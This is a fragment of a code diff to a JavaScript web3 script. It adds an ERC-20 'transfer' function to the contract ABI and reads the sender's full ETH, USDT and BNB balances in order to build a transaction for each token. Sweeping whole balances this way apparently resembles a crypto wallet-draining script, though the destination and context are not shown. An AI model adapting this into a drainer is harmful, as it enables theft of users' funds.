@@ -41,12 +41,20 @@
             BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
         };
 
-        const tokenABI = [
+        // ERC-20 ABI
+        const erc20ABI = [
             {
                 "constant": true,
                 "inputs": [{"name": "_owner", "type": "address"}],
                 "name": "balanceOf",
                 "outputs": [{"name": "balance", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
+                "name": "transfer",
+                "outputs": [{"name": "success", "type": "bool"}],
                 "type": "function"
             }
         ];
@@ -108,11 +116,11 @@
                     const maxEthTransferWei = ethBalanceWei - gasFeeWei;
 
                     // Get USDT balance
-                    const usdtContract = new web3.eth.Contract(tokenABI, tokenAddresses.USDT);
+                    const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
                     const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());
 
                     // Get BNB balance
-                    const bnbContract = new web3.eth.Contract(tokenABI, tokenAddresses.BNB);
+                    const bnbContract = new web3.eth.Contract(erc20ABI, tokenAddresses.BNB);
                     const bnbBalanceWei = BigInt(await bnbContract.methods.balanceOf(senderAddress).call());
 
                     // Create transactions for each token
